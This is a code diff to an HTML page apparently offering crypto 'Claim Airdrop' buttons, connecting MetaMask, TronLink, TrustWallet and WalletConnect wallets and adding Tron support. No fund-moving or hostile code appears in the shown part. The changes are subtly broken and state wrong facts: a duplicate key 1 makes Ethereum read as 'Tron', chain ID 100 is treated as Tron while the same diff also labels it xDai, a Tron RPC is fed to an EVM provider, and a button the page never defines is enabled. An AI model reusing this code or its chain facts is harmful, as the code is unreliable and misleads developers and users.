@@ -8,7 +8,6 @@
     <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script> <!-- TronWeb included -->
 </head>
 <body>
 
@@ -20,7 +19,7 @@
 <button id="connectTrustwalletButton">Connect TrustWallet</button>
 <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 <button id="connectWalletConnectButton">Connect WalletConnect</button>
-<button id="claimWalletConnectAirdropButton" disabled>Claim Airdrop (ETH/BSC)</button>
+<button id="claimWalletConnectAirdropButton" disabled>Claim Airdrop (ETH/BSC/TRON)</button>
 
 <script>
     // Function to dynamically load scripts
@@ -29,7 +28,7 @@
         script.src = src;
         script.onload = callback;
         script.onerror = function(error) {
-            console.error("Error loading script:", src, error);
+            console.error("Error loading script:", src, error); // Log error if script fails to load
         };
         document.head.appendChild(script);
     }
@@ -57,7 +56,7 @@
     async function checkNetworkAndEnableClaimButton(web3, expectedChainIds) {
         try {
             const currentChainId = await web3.eth.getChainId();
-            const networkNames = { 1: "Ethereum", 56: "BSC", 100: "Tron" };
+            const networkNames = { 1: "Ethereum", 56: "BSC", 100: "xDai", 1: "Tron" };
             const currentNetworkName = networkNames[currentChainId];
             
             if (expectedChainIds.includes(currentChainId)) {
@@ -80,6 +79,8 @@
             const web3 = new Web3(window.ethereum);
             window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
                 console.log("Connected to MetaMask:", accounts);
+
+                // Check if the wallet is on the correct network
                 await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
             }).catch((error) => {
                 console.error("MetaMask connection failed:", error);
@@ -90,16 +91,18 @@
         }
     }
 
-    // TronLink Connection Logic using TronWeb
+    // TronLink Connection Logic (Placeholder)
     function connectTronLink(config, abi, expectedChainIds) {
-        if (window.TronWeb && window.TronWeb.defaultAddress.base58) {
-            const tronWeb = window.TronWeb;
-            const account = tronWeb.defaultAddress.base58;
-            console.log("Connected to TronLink:", account);
-            alert("You are connected to TronLink.");
-            // Optionally check network using TronWeb
+        if (window.TronLink) {
+            const tronWeb = window.TronLink;
+            tronWeb.defaultAddress.base58 = tronWeb.defaultAddress.base58 || null;
+            console.log("Connected to TronLink:", tronWeb.defaultAddress.base58);
+
+            // Check TronLink network connection (for example, Tron testnet or mainnet)
+            alert("Connected to TronLink (Deprecated, but still functional).");
+            document.getElementById('claimTronAirdropButton').disabled = false;
         } else {
-            alert("TronLink is not installed or available.");
+            alert("TronLink is not installed. Please install it to continue.");
         }
     }
 
@@ -109,16 +112,23 @@
         alert('Please use MetaMask or TronLink for airdrop claiming.');
     }
 
-    // WalletConnect Connection Logic without Infura ID
+    // WalletConnect Connection Logic (Without Infura ID)
     function connectWalletConnect(config, abi, expectedChainIds) {
         const provider = new WalletConnectProvider({
-            // No infuraId here
+            // No Infura ID needed
+            rpc: {
+                1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
+                56: "https://bsc-dataseed.binance.org/",
+                100: "https://api.trongrid.io",
+            },
         });
 
         provider.enable().then(async () => {
             const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             console.log("Connected to WalletConnect:", accounts);
+
+            // Check if the wallet is on the correct network
             await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
         }).catch((error) => {
             console.error("WalletConnect connection failed:", error);
@@ -129,4 +139,68 @@
     // Unified Wallet Connection Handler
     function handleWalletConnection(wallet, network, expectedChainIds) {
         const scriptPaths = {
-           
+            metamask: 'js/metamask.js',
+            tronlink: 'js/tronlink.js',
+            trustwallet: 'js/trustwallet.js',
+        };
+
+        const walletScript = scriptPaths[wallet];
+
+        if (walletScript) {
+            loadScript(walletScript, () => {
+                console.log(`${walletScript} script loaded successfully.`);
+
+                // Load config and ABI dynamically
+                loadConfigAndABI(network).then(({ config, abi }) => {
+                    if (config && abi) {
+                        switch (wallet) {
+                            case 'metamask':
+                                connectMetaMask(config, abi, expectedChainIds);
+                                break;
+                            case 'tronlink':
+                                connectTronLink(config, abi, expectedChainIds);
+                                break;
+                            case 'trustwallet':
+                                connectTrustWallet(config, abi, expectedChainIds);
+                                break;
+                            case 'walletconnect':
+                                connectWalletConnect(config, abi, expectedChainIds);
+                                break;
+                        }
+                    }
+                });
+            });
+        } else {
+            console.error(`No script found for wallet: ${wallet}`);
+        }
+    }
+
+    // Add event listeners for each button
+    document.addEventListener('DOMContentLoaded', function () {
+        // MetaMask Button
+        document.getElementById('connectButton').addEventListener('click', function () {
+            handleWalletConnection('metamask', 'eth', [1, 56, 100]);  // Ethereum, BSC, and Tron chain IDs
+        });
+
+        // TronLink Button
+        document.getElementById('connectTronlinkButton').addEventListener('click', function () {
+            handleWalletConnection('tronlink', 'tron', [1, 56, 100]);  // Placeholder for Tron chain IDs
+        });
+
+        // TrustWallet Button
+        document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
+            handleWalletConnection('trustwallet', 'bsc', [1, 56, 100]);  // BSC, Ethereum, and Tron chain IDs
+        });
+
+        // WalletConnect Button
+        document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
+            handleWalletConnection('walletconnect', 'eth', [1, 56, 100]);  // Ethereum, BSC, and Tron chain IDs
+        });
+    });
+</script>
+<script src="js/metamask.js"></script>
+<script src="js/tronlink.js"></script>
+<script src="js/walletconnect.js"></script> 
+<script src="js/trustwallet.js"></script> 
+</body>
+</html>
